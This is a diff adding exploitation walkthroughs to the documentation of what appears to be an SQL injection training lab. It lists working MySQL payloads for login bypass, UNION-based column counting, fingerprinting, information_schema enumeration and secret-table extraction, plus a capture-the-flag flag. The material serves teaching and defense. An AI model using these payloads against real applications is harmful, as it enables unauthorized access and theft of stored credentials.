@@ -139,6 +139,48 @@ The laboratory provisions a dedicated, segregated MySQL database (`sqli_lab_db`)
 
 ---
 
+## 🔬 Practical Exploitation Walkthroughs
+
+### Module 1: Authentication Bypass Lab
+* **Scenario 1.1: Tautology Injections (`' OR 1=1 -- `)**:
+  * Injected payload breaks string literal delimiters and appends an unconditionally TRUE predicate (`OR 1=1`), forcing MySQL to return the primary administrator record.
+* **Scenario 1.2: Inline Comment Truncation (`admin' -- ` or `admin' #`)**:
+  * Exploits MySQL's comment syntax (`-- ` with space or `#`) to truncate the rest of the query, discarding password checks entirely.
+* **Scenario 1.3: Parentheses Balancing (`') OR ('1'='1`)**:
+  * Balances grouped conditions in parenthesized query structures to prevent MySQL syntax parsing faults.
+
+### Module 2: Union-Based Injection & Schema Enumeration Lab
+* **Scenario 2.1: Column Count Determination**:
+  * Probe with `Hardware' ORDER BY 1 -- ` up to `Hardware' ORDER BY 5 -- ` (succeeds).
+  * Incrementing to `Hardware' ORDER BY 6 -- ` triggers **MySQL Error 1054** (`Unknown column '6' in 'order clause'`), establishing that the base query projects exactly 5 columns.
+* **Scenario 2.2: Data Type Reflection Mapping**:
+  * Test compatibility with:
+    ```sql
+    ' UNION SELECT 101, 'Probe Name', 'Probe Category', 13.37, 'Probe Description' -- 
+    ```
+  * Identifies which fields render onto the web catalog and checks numeric vs string column casting.
+* **Scenario 2.3: System & Engine Fingerprinting**:
+  * Extract engine metadata using MySQL global functions:
+    ```sql
+    ' UNION SELECT 101, @@version, database(), 0, user() -- 
+    ```
+* **Scenario 2.4: Information Schema Harvesting & Exfiltration**:
+  * Extract table names from MySQL's system catalog:
+    ```sql
+    ' UNION SELECT 101, table_name, table_schema, 0, table_type FROM information_schema.tables WHERE table_schema=database() -- 
+    ```
+  * Extract column definitions from target table `system_secrets`:
+    ```sql
+    ' UNION SELECT 101, column_name, data_type, 0, table_name FROM information_schema.columns WHERE table_name='system_secrets' -- 
+    ```
+  * Exfiltrate confidential credentials and harvest the challenge flag:
+    ```sql
+    ' UNION SELECT id, secret_name, classification, 0, secret_value FROM system_secrets -- 
+    ```
+  * Awards: `FLAG{mysql_information_schema_exfiltration_pwned}`.
+
+---
+
 ## 🛡️ Mitigation Analysis: Prepared Statements
 
 Every module features a dual-engine architecture permitting real-time comparison between vulnerable and secure implementations.
